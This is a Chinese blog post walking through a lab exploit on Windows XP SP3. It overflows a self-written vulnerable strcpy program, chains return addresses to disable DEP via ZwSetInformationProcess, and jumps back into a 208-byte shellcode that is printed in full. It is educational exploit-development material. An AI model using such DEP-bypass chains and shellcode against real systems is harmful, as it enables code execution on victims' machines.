---
layout:		post
title:		Ret2Libc实战之利用ZwSetInformationProcess
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H。
<!-- more -->


### 0x00 前期准备

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

void test()
{
	char tt[176];
	__asm int 3
	strcpy(tt, shellcode);
}

int main()
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	test();

	return 0;
}
```


### 0x01 分析栈布局

运行*.exe, OllyDbg在int 3断点断下, shellcode起始地址0x0012fdfc, 返回地址0x0012feb0

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x00.png)
![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x01.png)

Plugins->OllyFindAddr->Disable DEP, 检索关闭DEP的入口0x7c93cd24, 再找到一条"mov eax,1 retn"指令0x7c92e252

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x02.png)

0x0012feb0-0x0012fdfc=180 byte, 组织188 byte的shellcode

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

goto 0x7c93cd24下断, F9直接运行, 在这里捕捉到异常(写入了一个无效地址)

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x03.png)
![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x04.png)

这是由于覆盖掉了ebp, retn时将0x90909090 pop到ebp, 需要将ebp定位到一个可写地址

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x04.png)

用OllyFindAddr检索"545D"指令, 在0x5d1d8b85找到一个"push esp pop ebp retn"指令

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x05.png)

但造成retn后, esp位于高地址, 当有入栈操作时会覆盖掉传递的参数, shellcode作如下修改

```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

发现shellcode尾部的关键跳会被覆盖掉, 传入参数能关闭DEP, 但失去跳转到shellcode入口的机会

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x06.png)
![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x07.png)

利用一条retn 0x28指令(0x7c974a19), 让esp增大, 保证不会干扰到shellcode

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x08.png)

shellcode作如下修改

```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

OD附加上去调试, 关闭了DEP后来到这里, 再来一条jmp esp就能跳回栈区

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x09.png)
![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x0a.png)

在0x7dc5c1b4找到一条jmp esp指令, 继续修改shellcode

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x0b.png)

```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\xb4\xc1\xc5\x7d"		# jmp esp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

OD再次附加调试, 现在成功跳回栈区0x0012fec4处, 0x0012fdfc-0x0012fec4=-200

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x0c.png)

再回跳205 byte(包括跳转指令的5 byte)即可跳到shellcode, 给出完整的shellcode(208 byte)

```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# payload 113 byte
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90"			# 67 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\xb4\xc1\xc5\x7d"		# jmp esp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
"\xe9\x33\xff\xff\xff\x90\x90\x90";		# 回跳
```

OD附加上去调试, 现在栈区布局如下

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x0d.png)

直接F9运行, pwn~

![](/assets/img/exploit/2017-10-04-windows-xp-disable-dep/0x0e.png)